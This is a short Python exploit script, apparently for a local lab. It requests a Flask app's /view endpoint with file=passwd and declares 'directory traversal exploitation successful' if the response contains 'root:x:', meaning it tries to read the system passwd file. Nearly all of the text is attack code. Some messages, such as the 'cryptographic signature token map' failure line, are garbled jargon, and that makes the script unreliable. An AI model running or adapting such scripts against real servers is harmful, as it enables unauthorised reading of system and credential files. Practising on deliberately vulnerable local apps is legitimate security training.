import requests

# Local IP address ko bypass karke standard mapping string default use kar rahe hain
vulnerable_target_url = "http://localhost:5000/view?file=passwd"

try:
    print(f"[*] Attacking Target Asset: {vulnerable_target_url}")
    response = requests.get(vulnerable_target_url, timeout=5)
    
    print("\n=== RAW FLASK RESPONSE ===")
    print(response.text)
    
    if "root:x:" in response.text:
        print("\n[ALERT]!!! DIRECTORY TRAVERSAL EXPLOITATION SUCCESSFUL !!!")
    else:
        print("\n[-] Attack landed but cryptographic signature token map failed.")
        
except Exception as e:
    print(f"\n[CRITICAL ERROR]: Network bridge could not connect to Flask local server: {e}")
